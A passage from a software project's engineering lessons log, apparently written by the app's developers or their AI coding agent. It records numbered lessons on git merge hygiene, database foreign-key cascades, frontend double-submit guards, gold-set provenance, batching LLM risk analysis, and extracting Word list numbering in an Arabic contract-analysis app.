Every merge gate this arc (T0c-1 #152, French finalization #154, T0c-2 #155) fired the same false alarm: the precondition command `git diff --stat main...feature-branch` surfaced `CLAUDE.md` + `lessons.md` (or, worse, would show "thousands of lines / dozens of files") as if the branch had polluted itself — but the branch was clean. Root cause: LOCAL `main` had not been fast-forwarded after the previous merge, so it lagged `origin/main` by the already-merged commits (e.g. the T0b doc-sync `f401729`); the three-dot diff computes from the merge-base of *local* main and the branch, so everything between stale-local-main and origin/main gets wrongly attributed to the branch. The truth is the diff against the ACTUAL merge target: `git diff --stat origin/main...branch`, cross-checked with `gh pr view <n> --json files`. Both showed the real, clean footprint every time. The safe resolution is also non-destructive: `git branch -f main origin/main` (while checked out elsewhere) to sync local main, then re-run the exact command — it now matches origin. **The rule:** at a merge gate, NEVER treat a `main...branch` diff against local main as authoritative — local main is routinely stale after the prior merge; verify against `origin/main...branch` + the GitHub PR file list before treating a STOP condition (doc files, lockfiles, a giant diff) as real, and fast-forward local main to eliminate the phantom rather than "fixing" a non-problem.

### Lesson #233 — An FK's ON DELETE follows OWNERSHIP: CASCADE for owned children, RESTRICT for independent records you must not orphan — decide per relationship, not per table
T0c-1 added two FKs with deliberately OPPOSITE cascades. `contract_parties.contract_id` and `contract_party_contacts.contract_party_id` are `ON DELETE CASCADE`: a party (and its contacts) is an OWNED CHILD of the contract — it has no meaning or life once the contract is gone, so deleting the contract should sweep them. That is the exact opposite of T0b's `contracts.parent_contract_id`, which is `ON DELETE RESTRICT` (lesson #229): a child contract is an INDEPENDENT record whose parent must not be silently orphaned or destroyed. Same schema, same "self/parent-ish" shape, but the cascade is chosen by what the row IS relative to its FK target — a subordinate part (CASCADE) vs a peer that merely references another (RESTRICT). Copy-pasting either default onto the other would be wrong: CASCADE on the parent link would let deleting a MAIN silently wipe its children; RESTRICT on contacts would make a contract undeletable until every party was hand-cleared. **The rule:** pick a FK's `ON DELETE` from the ownership semantics of THAT relationship — CASCADE when the child is an owned part with no standalone existence, RESTRICT (or SET NULL, per #229) when it is an independent record an orphan would corrupt — never inherit the cascade from a sibling FK just because the column shapes look alike.

### Lesson #234 — Embedded full-replace children churn their IDs freely — which is safe precisely because the pin-freeze blocks edits exactly when stable IDs start to matter
T0c contacts are EMBEDDED in the party payload and updated by FULL REPLACE (the service `DELETE`s all contact rows for a party and re-inserts from the request), so a contact's `id` is NOT stable across edits — a trivial party edit mints brand-new contact ids. That would be a latent bug for anything that references a contact by id (a signing token, an invitation link, an audit pointer). It is safe in T0c-1 ONLY because of a timing interlock: no such reference exists yet (countersignature/invitations are a later slice), AND the moment the contract is signed, `assertContractMutable` blocks every party/contact write (409 CONTRACT_PINNED, lesson #227/#233 family) — so the contacts freeze, with their ids, exactly when a countersignature flow would first need to point at them. Pre-signing churn is harmless (nothing references them); post-signing stability is guaranteed (nothing can edit them). The design is only correct as long as that interlock holds. **The rule:** full-replace embedded children are fine while nothing external references a child by id — but when you add the first durable reference (token, invite, audit link), either switch to stable upsert-by-id semantics or verify a freeze (pinning / lifecycle lock) already makes the ids immutable before the reference is minted; write the assumption down so the later slice doesn't mint a token against an id that the next edit will orphan.

### Lesson #235 — A git-CLEAN auto-merge of two PRs that touched the same files still needs post-merge CI + a semantic parse/render check — git merges text, not i18n keys or tabConfig meaning
T0c-2 (#155) and a concurrently-merged risk-tab PR (#156) BOTH edited the same three locale JSONs (`{en,ar,fr}/common.json`) and `ContractDetailPage.tsx`, in nearby-but-non-overlapping regions. GitHub reported the PR MERGEABLE/CLEAN and the squash auto-merged with no textual conflict — but "textually clean" does not prove the combined result is semantically whole: git could just as easily have produced a valid-JSON file that dropped one side's keys, or a `tabConfig` with a duplicate/half-merged entry, without any conflict marker. The merge was verified only by (a) waiting for POST-MERGE main CI to conclude `success` (not the pre-merge PR CI, which ran against the old base), and (b) a read-only render check on the overlap: all three locales still parse, BOTH feature's key families survive (partiesEditor 54-key parity + the risk-tab keys, no loss/collision), and `tabConfig` lists both new tabs exactly once with no duplicates. All passed — but the point is they were CHECKED, not assumed from "CLEAN." **The rule:** when your PR and a freshly-landed main commit touch the same structured files (locale bundles, config arrays, generated manifests), a git-clean auto-merge is necessary but not sufficient — confirm with post-merge CI on the merged SHA plus a targeted parse/parity check that both sides' semantic content survived, because git guarantees no text conflict, not that your i18n keys or your config entries are all still there and unique.

### Lesson #236 — A QA-seed browser pass catches real-data display bugs that clean-fixture unit tests miss — and enumerate which UI states the seed CANNOT exercise, proving those in tests and reporting the split honestly
The 7.20 Slice-4a directory shipped with 30 green unit tests over pure display helpers — and the first live render against the QA seed still surfaced two real-data bugs in minutes. (1) `initialsOf('QA — Metro Development Corp')` rendered a "Q—" avatar: the fixture names ("Acme Contracting", "Jane Doe") never contained a separator-only token, but the seed's real naming convention does — the em-dash counted as a "word" and became an initial. Fix: skip words with no letter/digit (unicode-aware `\p{L}\p{N}`, which also makes Arabic-name initials work). (2) `job_title ?? null` handled NULL but not `''` — the seed exposed that the existing matrix idiom is `||` precisely because both shapes occur in real rows. Neither bug is reachable from fixtures an author invents AFTER writing the component, because fixtures inherit the author's assumptions about data shape — the seed is somebody else's assumptions, which is the point (the #135/#212 real-data discipline applied to pure DISPLAY helpers, not just aggregations). The INVERSE lesson from the same pass: the QA seed had NO party in `INVITED` status, so the three-state badge could only be live-verified for two states — the right response is NOT to mutate the seed (forbidden mid-slice; it is shared QA state) but to enumerate what the seed cannot show, keep those states pinned by unit tests, and say so explicitly in the PR ("Active + Pending verified live; Invited by test only"). **The rule:** every new display surface gets one browser pass against the QA seed before review — checking specifically for real-data shapes (separator tokens, empty-string-vs-null, RTL text) the fixtures didn't model; and when the seed can't exercise a state, name the gap in the PR instead of letting "verified live" silently overclaim.

### Lesson #237 — `npx tsc` in a worktree without node_modules runs npm's decoy tsc stub and exits 0 — a phantom-clean typecheck baseline; symlink the real node_modules and run the repo's own tsc binary
Building the Slice-4a "zero new tsc errors vs origin/main" proof, the baseline run in a fresh `git worktree` of origin/main reported **0 errors** — which read as "main is clean" when main actually has 1,158 pre-existing errors. The worktree had no `node_modules`, so `npx tsc` resolved to npm's decoy `tsc` package (the one that prints "This is not the tsc command you are looking for") — which exits 0 having typechecked NOTHING, and with stderr unredirected the error-count grep saw an empty file and returned 0. A phantom-clean baseline would have made the branch's 1,158 pre-existing errors look like 1,158 NEW errors (or worse, tempted a "matches the known-dirty build" hand-wave). Fix: symlink the main checkout's `node_modules` into the worktree (root + any nested app-level dir) and invoke the repo's own binary (`<main>/node_modules/.bin/tsc --noEmit`) from the worktree — baseline then reported the true 1,158, and the branch-vs-baseline `comm` diff proved the real delta (only line-shifted test-file errors; verified identical after stripping `(line,col)`). This is the #191/#132/#134 family — the harness's resolution environment decides whether the number means anything — with a vicious twist: the failure mode is a PASSING exit code, not a loud connect-timeout. **The rule:** any verification run inside a fresh worktree/checkout must first prove its toolchain is the real one (run `tsc --version` / check the binary path) before trusting its output — and when a baseline count comes back suspiciously clean (0 errors in a repo known to carry pre-existing debt), treat the harness as the suspect before the code; a comparison proof needs `comm` on normalized error lists, not just two grep counts.

### Lesson #238 — When a side-effect endpoint has NO server-side idempotency, the frontend confirmation + in-flight guard IS the safety mechanism — and a re-entry guard needs BOTH its acquire AND its RELEASE mutation-tested (a stuck release silently swallows every future action while acquire tests stay green)
7.20 Slice 4b wired the "Send/Resend invite" buttons to `POST /project-parties/:id/invite`. Recon (and a re-read of `project-parties.service.ts:117-148`) confirmed the endpoint sends a **REAL email on EVERY call** with **no idempotency, no rate limit, no already-invited guard**, and it **regenerates `invitation_token` each call** (killing the previously-sent link) and sets `invitation_status='INVITED'` unconditionally (re-inviting an ACCEPTED party silently downgrades it). There is nothing on the server to lean on: a double-click, or a mis-click on "Resend", dispatches duplicate real emails to a real external counterparty. So the frontend guards are not polish — they ARE the mechanism: a **confirmation dialog** (nothing sends without an explicit Confirm, stating WHO gets emailed + WHAT happens) plus an **in-flight guard**. The in-flight guard is two layers: `isPending` disabling the buttons (the *visible* layer) and a synchronous `useRef` (`inviteInFlight`) flipped to `true` **before** `mutate()` (the *real* layer) — because in a real browser two native clicks can both dispatch before React commits the `disabled` attribute, so the ref, not the attribute, is what structurally blocks the second POST. An adversarial reviewer empirically confirmed this: removing the ref makes the same-tick double-click test go RED (2 calls) — `disabled` does NOT commit between two synchronous `fireEvent.click`s under React Query v5 + `act()`, so the ref is genuinely the thing under test, not a decoration. The sharper finding was about the OTHER half of the ref's lifecycle: `confirmInvite` **acquires** the ref (`= true`) and only `onSettled` **releases** it (`= false`). Deleting just the release line left **all 15 tests green** — yet in production a stuck-true ref means every subsequent Confirm (any party, same mounted session) hits `if (... || inviteInFlight.current) return` and becomes a silent no-op: no POST, no toast, no feedback. The existing error-path test missed it because it only asserted `not.toBeDisabled()` (which reads `isPending`, reset by React Query independently of the ref) and never RE-CLICKED Confirm to prove a second POST fires. Fix: one test that fails a first invite, waits for the error, then re-clicks Confirm and asserts `invite` was called **twice** — mutation-verified to go RED when the `onSettled` reset is removed and GREEN when present. Note the failure direction of a broken release is *under*-sending (invites silently not sent), the opposite of the over-send the slice primarily guards — which is exactly why acquire-only coverage feels complete but isn't. **The rule:** (1) when a POST has real, irreversible side effects and the backend has no idempotency, treat the frontend confirm-dialog + synchronous in-flight guard as a *tested safety requirement*, not UX — and disable the trigger via a synchronous ref set before `mutate()`, not the `disabled` attribute alone (the attribute lags a real double-click by a commit). (2) Any acquire/release re-entry guard (a ref, a lock, a "submitting" flag) must have BOTH transitions mutation-tested: prove the acquire blocks the second concurrent call AND prove the release re-enables the next deliberate one — a green suite that never exercises the release will pass with the release deleted, and the resulting bug (every future action silently swallowed) is invisible until a user hits it. Mutation-test the guard by deleting each half and confirming a *specific* test goes RED; if none does, the coverage is decorative.
### Lesson #239 — Chunked Arabic extraction truncates long multi-bullet clauses DETERMINISTICALLY per document template — the same GC section vanishes across every contract built from that template
Auditing the Phase 8.3 corpus for the gold set, the ~40 REJECTED clauses were not random OCR noise — the tail-loss clustered by TEMPLATE FAMILY: the two NTA-template twins both lose the same General-Conditions sections (10/12/15/38), the Orascom family loses GC section 3 in 4 of 4 contracts, and the O&M twins both drop clause 9. A truncation that reproduces on the same section across every sibling contract is not "a bad scan" — it is a **structural chunker bug** (the boundary/size logic mishandles a specific long multi-bullet clause shape in that template, so the tail past the chunk boundary is silently dropped; same silent-clause-loss family as lessons #192/#194/#199, new trigger). Because it is deterministic, it is both diagnosable (diff the rejected clause against the source DOCX at the known section) and fixable at the root, after which those ~16+ clauses can be re-extracted and enter the gold set. **The rule:** when clause-loss clusters by template/section rather than scattering, treat it as a reproducible chunker defect to root-cause + re-extract — not as per-document scan damage to wave through; and audit rejections BY TEMPLATE FAMILY, because the pattern is the diagnosis.

### Lesson #240 — AI triage judges COHERENCE, not COMPLETENESS — it systematically clears truncated/OCR-damaged clauses (it has no source to compare against), so a pre-screen ranks human attention, it never replaces source comparison
The AI triage pass (`docs/phase-8.3-annotation-triage.md`) read every clause and flagged only 4 junk-candidates; the human review then rejected 40 — 30+ truncation/OCR cases the AI had cleared, including at least one clause the triage explicitly called "INTACT — not split." The reason is structural: the model sees only the extracted text, which reads as coherent Arabic right up to where it was cut — a truncated clause ends mid-bullet but is locally fluent, and the model has NO access to the source DOCX to notice the missing tail. So the pre-screen is genuinely useful (it prioritizes where a human looks first and fast-approves the obvious agrees) but it is **blind to exactly the defect class that matters for a gold set** — completeness. Trusting "AI verified intact" would have shipped truncated clauses as ground truth. **The rule:** an AI pre-screen prioritizes human attention; it does NOT certify completeness. Any "intact / verified" verdict from a coherence-only reader must still be confirmed against the source before a clause enters a gold set — and the metric to watch is what the human pass CHANGED after the AI cleared it (here 30+), which measures the pre-screen's blind spot honestly.

### Lesson #241 — Clause TEXT edits overwrite in place with NO original snapshot (unlike risk/party edits) AND lock the review card afterward — so a hand-edit is unrecoverable and un-reviewable; truncated → REJECT, never hand-fix
Risk edits (`is_edited_by_user` + `original_risk_level`/`_category`/`_recommendation`) and party edits (`original_party_first/second_name`) both snapshot the AI original once, so a correction is auditable and revertible. Clause TEXT has NO equivalent: `clauses.content` is updated in place, there is no `original_content`, `customizations` is empty, and the 7 EDITED clauses carry no version parent — so a hand-edit to clause text is **unrecoverable**, and the review card additionally LOCKS (no Approve/Edit/Reject affordance) after a text-edit save, making the clause un-reviewable too. During annotation this means the tempting "just fix the truncated tail by hand" both destroys the AI baseline AND strands the card. The correct move for a truncated clause is REJECT (exclude from gold) and fix at the extraction root (lesson #239), not hand-repair. **The rule:** never hand-edit clause text during annotation — a truncated/damaged clause is REJECTED, not patched; and the real fix is to give clause edits the same snapshot+revert+unlock treatment risk/party edits already have (backlog).

### Lesson #242 — Party extraction fails SYSTEMATICALLY, not as one-offs — ~7 of 15 contracts had a party missing, second-party missing, or swapped into the wrong slot; treat parties as a known-unreliable extraction surface
The gold-set provenance pass found `is_parties_edited_by_user=true` on roughly half the corpus (10/15 by the flag; the human session characterized ~7 as genuinely broken vs cosmetic): first party present but second missing, both missing, or first⇄second swapped into the wrong slot. This is not annotator nitpicking — it is a repeatable extraction defect (the reversed-party EXTRACTION regex in `document-processing.service.ts` is the tracked root cause), which is why the PR #130 party-editing UI + swap button exist at all. For the gold set it means party fields carry a provenance tag (extracted / manually-entered / swapped) and are OUT of the clause/risk gold scope. **The rule:** parties are a known-unreliable extraction surface — record provenance per contract, never assume the extracted parties are correct, and prioritize the extraction-regex root fix rather than leaning on manual correction forever.

### Lesson #243 — "Duplicate" risks were 0 textual and ~160 LLM-SEMANTIC ("same issue, different words") — many are genuinely DISTINCT; hide clutter via UI (top-2/Show-more), never bulk-delete on semantic similarity
The "~34 duplicates to clean up" premise did not survive measurement: 0 exact-match and 0 near-identical-by-token (Jaccard ≥ 0.7) risk pairs existed; the only "duplicates" were ~160 pairs an LLM judged "same underlying issue, different wording" — and inspection showed many are DISTINCT risks (a payment-timing risk and a retention-release risk on the same clause read as "same issue" to a similarity judge but are separately actionable). Bulk-deleting on semantic similarity would have destroyed real, human-relevant findings and corrupted the gold set. The shipped answer (PR #156) was to keep every row and reduce visible CLUTTER instead: default to the top-2 per clause, collapse the rest behind Show-more, and ship the soft-delete column at **0 rows flagged**. **The rule:** semantic-similarity is a display/ranking signal, NOT a delete criterion; when "duplicates" are only LLM-semantic, hide them in the UI and preserve the data — destructive dedup requires exact/near-exact textual identity or per-row human judgement.

### Lesson #244 — A gold set must tag verified vs unverified EXPLICITLY — AI-chosen or AI-labeled rows silently counted as "human-verified" poison both training and the Claude-vs-ContractBERT benchmark
The Phase 8.3 corpus is annotated live and only partially: of 1,246 risks, 236 are human-edited (`is_edited_by_user`), 187 of the visible top-2 are verified, and the rest stand as unreviewed AI pre-labels. Exporting these as one undifferentiated "gold" file would let 8.4/8.5 train on — and benchmark against — AI output relabeled as ground truth, inflating any model's apparent agreement with "humans" (it is really agreeing with the earlier AI pass). The export therefore tags every row `verified` / `unverified` / `visible` / `clause_rejected`, exposes a `clean_training_signal` (verified ∧ ¬clause_rejected = 212), and the manifest header states in bold that downstream MUST filter `verified=true` for clean signal. The same discipline flags that a clause on a REJECTED (excluded) clause is kept-but-tagged, never silently mixed with valid-clause risks. **The rule:** provenance is a first-class field in any gold set — verified-by-human vs AI-pre-label must be explicit and filterable at the row level, or the benchmark measures the AI against itself; never let "included in the export" imply "human-validated."

### Lesson #245 — Protect a "customize dashboard's" fixed spine BY EXCLUSION from the widget registry, not by a per-control guard — a widget that isn't in the model can't be hidden or reordered by any code path
7.20 Slice 5 made only the four SUPPORTING ANALYTICS widgets customizable; the ProjectHealthBar and ProjectAttentionZone (the "30-second test" — health + what-needs-you-today, always lead) must never be hideable or reorderable. The robust way to enforce that is a data-model boundary, not UI guards: the layout model's `KNOWN_WIDGET_IDS` contains exactly the 4 analytics widgets, the spine components live OUTSIDE the customizable component entirely (they render above it in ProjectDetailPage with no manage controls), and `normalizeLayout` drops any id not in the registry. There is therefore NO reorder/hide code path that can touch the spine — you'd have to add it to the registry first. A per-widget "isFixed" flag checked at each control would have been one forgotten check away from a hideable health bar. The live QA pass confirmed it: the customize panel's manage list contained only the 4 analytics rows; Project Health and Needs-your-attention sat above with zero controls. **The rule:** when part of a surface is deliberately non-customizable, express that as "not in the customizable set" (exclusion at the model), not as "in the set but flagged fixed" (a guard you can forget) — and keep the fixed parts in a different component so no shared control can reach them.

### Lesson #246 — A persisted UI-layout value must be RECONCILED against the live widget registry on every load, never trusted verbatim — corrupt→default, unknown-id→dropped, missing-id→appended-visible
Slice 5's layout persists `{order, hidden}` to localStorage. A stored value can be corrupt (bad JSON / hand-edited), can reference a widget removed in a later release, or can be missing a widget added in a later release — and trusting it verbatim crashes the dashboard, renders a ghost widget, or silently drops a new one. The fix is a pure `normalizeLayout(raw)` that runs on EVERY load: non-object/corrupt → the full default; unknown ids → filtered out (future-proof against removed widgets); known ids missing from the stored order → appended defaulting to VISIBLE (a new widget shows up, it is not swallowed); hidden entries not present in the resolved order → dropped. This is the localStorage analogue of lesson #210's "the wire lies to your types" — persisted state is untrusted input from a past version of your own code. The resilience case is a first-class TEST, not an afterthought: a corrupt stored value must render the default layout and never throw. **The rule:** treat persisted UI state as adversarial input from a prior schema — reconcile it against the current registry on load (default on corrupt, drop unknowns, append missing-as-visible), and unit-test the corrupt/unknown/missing paths explicitly.

### Lesson #247 — Reset per-project persisted state with `key={projectId}` (remount), not a reload-on-prop-change effect — the reload-effect + save-on-change effect race and can write project A's layout under project B's key
ProjectAnalyticsRow loads its layout from a per-user-and-project localStorage key in a useState initializer and persists on change via an effect. React Router does NOT remount a detail page when only the `:id` param changes, so without care the mounted component keeps project A's layout when the user navigates to project B. The tempting fix — a `useEffect(() => setLayout(loadLayout(newKey)), [key])` — RACES the save-on-change effect: on the key flip, the save effect (keyed on `[storageKey, layout]`) can fire with the NEW key and the OLD layout before the reload effect replaces it, writing A's layout under B's key (cross-project contamination). The clean fix is `key={projectId}` at the call site: a project switch remounts the component, the initializer loads the right layout, `storageKey` is stable for the instance, and a `firstRun` ref skips the initial save so merely visiting a dashboard never writes a default row. **The rule:** when a component owns per-entity persisted state and the router reuses it across entities, remount it with `key={entityId}` — don't hand-sync with reload effects that race your persistence effect.

### Lesson #248 — When a parallel merge advanced origin/main but a full rebase would entangle a forbidden WIP file, forward just the doc files with `git checkout origin/main -- lessons.md CLAUDE.md` — clean merge, zero blast radius
This branch was cut from a local main that lagged origin/main by one docs-only commit (Ayman's lessons #239–244 + a CLAUDE.md section), and that commit ALSO modified `NEXT_PHASES.md` — a gitignored-but-tracked file carrying the CEO's uncommitted local WIP that I was told to leave entirely alone. A full `git rebase origin/main` would have (a) required a clean tree (the WIP files are dirty) and (b) rewritten `NEXT_PHASES.md` to origin's version, entangling the CEO's WIP. Numbering my lessons above origin's tail and leaving my branch's lessons.md at the old base would instead force a tail conflict for the CEO at merge time. The surgical fix: `git checkout origin/main -- lessons.md CLAUDE.md` forwards ONLY those two allowed doc files to origin's content in my tree, I append #245+ on top, and the eventual merge is clean (my docs = origin #244 + my additions) — while `NEXT_PHASES.md` and `.claude/settings.local.json` stay untouched. **The rule:** to reconcile docs against an advanced origin without a full rebase's blast radius, `git checkout <origin-ref> -- <just-the-doc-files>` and build on top — never rebase across a commit that rewrites a file you were told not to touch.

### Lesson #249 — An append-on-re-run writer inflates counts AND hides per-run under-coverage — make risk/finding writers REPLACE (preserving human edits), so one run's true coverage is visible
Project9's risk tab showed 46 risks across 28 clauses and looked comprehensive — but that 46 was the SUM of 3-4 separate `finalizeReview` runs, each of which the poller APPENDED. A single run actually produced ~12-14 risks covering only ~10/28 clauses (36%); the append-stacking masked that every individual run under-covered. Worse, stacking made re-running a hazard — it duplicated risks with no way to "refresh" without piling on. The fix (Issue 5): the writer now DELETEs prior AI rows (`is_edited_by_user = false AND merged_at IS NULL`) before saving, so a re-run REPLACES — human-edited/merged rows are preserved, non-human AI rows are cleared, and the count reflects ONE run's real coverage. **The rule:** a writer that re-runs against the same parent should REPLACE its own prior output (scoped to exclude human-curated rows), not append — append inflates totals and, more dangerously, hides that any single run is incomplete.

### Lesson #250 — One monolithic "analyze all of these" AI call self-selects only the salient items — to guarantee coverage, batch the list and instruct the model to assess EVERY item
`RiskAnalyzerAgent` sent the whole clause list in one call and asked for "the risks" — and the model returned risks for only the ~10 most salient clauses of 28, silently skipping the rest (it reads "find the risks" as "find the notable risks"). No amount of prompt scolding about completeness reliably fixes a single-call ask over a long list. The fix (Issue 5): split the clauses into small batches (`RISK_BATCH_SIZE = 4`) and instruct the model to assess EVERY clause in the batch (0 risks only if genuinely low-risk) — small batches make "cover all of these" tractable, and coverage went 10/28 → 28/28. Same shape as the clause-extractor's chunking, applied to analysis. **The rule:** when you need an AI to cover EVERY item of a list (not just the interesting ones), don't hand it the whole list in one call — batch into small groups and require a verdict per item; a single call over a long list self-selects the salient few.

### Lesson #251 — Verify a premise before building the fix for it — the 15 "Uncategorized" risks were AI-CHOSEN, not alias-map misses, so the fix was prompt vocabulary, not a bigger map
The plan for Issue 5's category task assumed the remaining `Uncategorized` risks were real AI category names the `RISK_CATEGORY_ALIASES` map failed to translate — i.e. "extend the map." Pulling the audit log FIRST showed the opposite: all 15 attempted categories were literally `"Uncategorized"` — the model itself emitted the placeholder because its prompt offered only ~10 narrow category names, and every REAL category it returned had already aliased cleanly (31/31). Extending the map would have added dead entries and fixed nothing; the actual fix was to BROADEN the prompt's category vocabulary so the model stops choosing "Uncategorized" (33% → 0%). Had I built the assumed fix, a re-pilot would have shown the same 33% and wasted an AI run. **The rule:** before implementing the fix a task PRESCRIBES, spend one query to confirm the failure mode is what the task assumes — grounding the premise (here: read the audit log) can flip "extend the map" into "change the prompt" and save you from shipping a no-op.

### Lesson #252 — When you split a slow AI job into batches, PARALLELIZE them and size the poll window to the job's new shape — sequential batches can exceed the caller's timeout and save nothing
Issue 5's first cut ran the risk batches SEQUENTIALLY. Each Arabic risk call is ~60-90s, so 7 batches took ~9-12 min — but the backend risk poller gave up after 60×3s = 180s. The job eventually finished on the AI side, but the poller had already timed out, so the clear + save NEVER ran and the DB stayed at the old count: a "successful" job that saved nothing. Two coupled fixes: (1) run the batches CONCURRENTLY (`ThreadPoolExecutor`, `RISK_BATCH_CONCURRENCY = 4`) over the existing rate-limit gate → ~104s; (2) raise the poller `MAX_POLLS` to 100 (~5 min) to match the batched job's wall-clock. Either fix alone was insufficient — parallelism without the window bump still risked slow runs; a bigger window without parallelism just waits longer. **The rule:** decomposing one AI call into N calls multiplies wall-clock — parallelize the batches AND re-size every downstream timeout/poll window to the job's new duration, or the orchestrator times out and the work is silently discarded.

### Lesson #253 — Word auto-numbering and bullets live in `numPr` metadata that python-docx `paragraph.text` does NOT return — reconstruct the marker from numbering.xml or lose it silently
Project9 had 24/28 clauses with empty `section_number` even though the document "looked" numbered on screen. Root cause: a Word list item's displayed marker (`1.`, `1-1`, `•`) is NOT literal run text — it lives in the paragraph's `numPr` reference into `numbering.xml`, and python-docx's `paragraph.text` returns ONLY concatenated run text. So auto-numbered clauses arrived number-less (→ empty section_number) and bulleted lists arrived structure-less (→ flattening), while a handful of MANUALLY-typed numbers (`1-`, `14.`) survived because they ARE literal runs. The fix reconstructs each marker from the `<w:num>/<w:abstractNum>/<w:lvl>` definitions + a running per-list counter and prepends it before the paragraph join — verified `section_number` fill 4/28 → 27/28 on a fresh upload. **The rule:** when extracting from .docx, remember list numbers and bullet glyphs are FORMATTING METADATA (`numPr` → numbering.xml), not text — if you rely on `paragraph.text` you silently drop them; resolve the numbering definitions and rebuild the label, or accept invisible numbers and lost list structure.
